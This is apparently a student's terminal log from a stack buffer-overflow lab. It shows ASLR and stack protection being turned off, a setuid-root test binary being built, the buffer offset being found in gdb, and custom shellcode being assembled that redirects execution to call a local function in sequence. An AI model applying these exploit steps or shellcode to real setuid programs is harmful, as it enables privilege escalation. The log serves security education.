[06/16/22]seed@VM:~/.../a2_16$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/16/22]seed@VM:~/.../a2_16$ sudo ln -sf /bin/zsh /bin/sh
[06/16/22]seed@VM:~/.../a2_16$ sudo su
root@VM:/home/seed/practice/a2_16# gcc -m32 -o a1 -z execstack -fno-stack-protector a1.c
root@VM:/home/seed/practice/a2_16# sudo chown root a1
root@VM:/home/seed/practice/a2_16# sudo chmod 4755 a1
root@VM:/home/seed/practice/a2_16# su seed
[06/16/22]seed@VM:~/.../a2_16$ 
[06/16/22]seed@VM:~/.../a2_16$ touch badfile
[06/16/22]seed@VM:~/.../a2_16$ gcc  -m32 -o a1_dbg -g -z execstack -fno-stack-protector a1.c
[06/16/22]seed@VM:~/.../a2_16$ gdb a1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from a1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x124d: file a1.c, line 13.
gdb-peda$ run
Starting program: /home/seed/practice/a2_16/a1_dbg 
Inside Main
[----------------------------------registers-----------------------------------]
EAX: 0xffffcdb7 --> 0x1f7 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0xfbad24a8 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd608 --> 0x0 
ESP: 0xffffcd9c --> 0x56556382 (<main+122>:	add    esp,0x10)
EIP: 0x5655624d (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556244 <frame_dummy+4>:	jmp    0x565561a0 <register_tm_clones>
   0x56556249 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x5655624c <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x5655624d <bof>:	endbr32 
   0x56556251 <bof+4>:	push   ebp
   0x56556252 <bof+5>:	mov    ebp,esp
   0x56556254 <bof+7>:	push   ebx
   0x56556255 <bof+8>:	sub    esp,0x324
[------------------------------------stack-------------------------------------]
0000| 0xffffcd9c --> 0x56556382 (<main+122>:	add    esp,0x10)
0004| 0xffffcda0 --> 0xffffcdb7 --> 0x1f7 
0008| 0xffffcda4 --> 0x1 
0012| 0xffffcda8 --> 0x844 
0016| 0xffffcdac --> 0x5655a1a0 --> 0xfbad2498 
0020| 0xffffcdb0 --> 0xf7fcb110 --> 0xf7dcd000 --> 0x464c457f 
0024| 0xffffcdb4 --> 0xf7de4a3b ("ld-linux.so.2")
0028| 0xffffcdb8 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffcdb7 "\367\001") at a1.c:13
13	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fc8 --> 0x3ed0 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0xfbad24a8 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffcd98 --> 0xffffd608 --> 0x0 
ESP: 0xffffca70 --> 0x3 
EIP: 0x56556265 (<bof+24>:	sub    esp,0x8)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556255 <bof+8>:	sub    esp,0x324
   0x5655625b <bof+14>:	call   0x565563a6 <__x86.get_pc_thunk.ax>
   0x56556260 <bof+19>:	add    eax,0x2d68
=> 0x56556265 <bof+24>:	sub    esp,0x8
   0x56556268 <bof+27>:	push   DWORD PTR [ebp+0x8]
   0x5655626b <bof+30>:	lea    edx,[ebp-0x327]
   0x56556271 <bof+36>:	push   edx
   0x56556272 <bof+37>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffca70 --> 0x3 
0004| 0xffffca74 --> 0x0 
0008| 0xffffca78 --> 0xffffca80 --> 0x0 
0012| 0xffffca7c --> 0x3ffff24c 
0016| 0xffffca80 --> 0x0 
0020| 0xffffca84 --> 0x0 
0024| 0xffffca88 --> 0x0 
0028| 0xffffca8c --> 0xffffca70 --> 0x3 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
16	    strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffcd98
gdb-peda$ p &buffer
$2 = (char (*)[799]) 0xffffca71
gdb-peda$ p/d 0xffffcd98 - 0xffffca71
$3 = 807
gdb-peda$ disas foo
Dump of assembler code for function foo:
   0x56556286 <+0>:	endbr32 
   0x5655628a <+4>:	push   ebp
   0x5655628b <+5>:	mov    ebp,esp
   0x5655628d <+7>:	push   ebx
   0x5655628e <+8>:	sub    esp,0x14
   0x56556291 <+11>:	call   0x56556249 <__x86.get_pc_thunk.dx>
   0x56556296 <+16>:	add    edx,0x2d32
   0x5655629c <+22>:	mov    ecx,DWORD PTR [ebp+0x8]
   0x5655629f <+25>:	mov    eax,ecx
   0x565562a1 <+27>:	shl    eax,0x2
   0x565562a4 <+30>:	add    eax,ecx
   0x565562a6 <+32>:	add    eax,eax
   0x565562a8 <+34>:	mov    ecx,eax
   0x565562aa <+36>:	mov    eax,DWORD PTR [ebp+0xc]
   0x565562ad <+39>:	add    eax,ecx
   0x565562af <+41>:	mov    DWORD PTR [ebp-0xc],eax
   0x565562b2 <+44>:	sub    esp,0x8
   0x565562b5 <+47>:	push   DWORD PTR [ebp-0xc]
   0x565562b8 <+50>:	lea    eax,[edx-0x1fc0]
   0x565562be <+56>:	push   eax
   0x565562bf <+57>:	mov    ebx,edx
   0x565562c1 <+59>:	call   0x565560b0 <printf@plt>
   0x565562c6 <+64>:	add    esp,0x10
   0x565562c9 <+67>:	mov    eax,DWORD PTR [ebp-0xc]
   0x565562cc <+70>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562cf <+73>:	leave  
   0x565562d0 <+74>:	ret    
End of assembler dump.
gdb-peda$ q
[06/16/22]seed@VM:~/.../a2_16$ nasm -f elf32 mysh.s -o mysh.o
[06/16/22]seed@VM:~/.../a2_16$ xxd -p -c 20 mysh.o
7f454c4601010100000000000000000001000300
0100000000000000000000004000000000000000
3400000000002800050002000000000000000000
0000000000000000000000000000000000000000
0000000000000000000000000000000000000000
0000000001000000010000000600000000000000
100100002f000000000000000000000010000000
0000000007000000030000000000000000000000
4001000021000000000000000000000001000000
0000000011000000020000000000000000000000
7001000040000000040000000300000004000000
1000000019000000030000000000000000000000
b00100000f000000000000000000000001000000
00000000000000000000000031c931c0b001b107
5150bb86625556ffd331c95150ffd3b1055150ff
d331c95150ffd3b1025150ffd3b1015150ffd300
002e74657874002e7368737472746162002e7379
6d746162002e7374727461620000000000000000
0000000000000000000000000000000000000000
000000000100000000000000000000000400f1ff
0000000000000000000000000300010008000000
000000000000000010000100006d7973682e7300
5f73746172740000
[06/16/22]seed@VM:~/.../a2_16$ python3 convert.py 
Length of the shellcode: 47
shellcode= (
   "\x31\xc9\x31\xc0\xb0\x01\xb1\x07\x51\x50\xbb\x86\x62\x55\x56\xff"
   "\xd3\x31\xc9\x51\x50\xff\xd3\xb1\x05\x51\x50\xff\xd3\x31\xc9\x51"
   "\x50\xff\xd3\xb1\x02\x51\x50\xff\xd3\xb1\x01\x51\x50\xff\xd3"
).encode('latin-1')
[06/16/22]seed@VM:~/.../a2_16$ python3 exploit.py 
[06/16/22]seed@VM:~/.../a2_16$ ./a1
Inside Main
Processing Sensitive Information 17
Processing Sensitive Information 170
Processing Sensitive Information 1705
Processing Sensitive Information 17050
Processing Sensitive Information 170502
Processing Sensitive Information 1705021
Segmentation fault
[06/16/22]seed@VM:~/.../a2_16$ 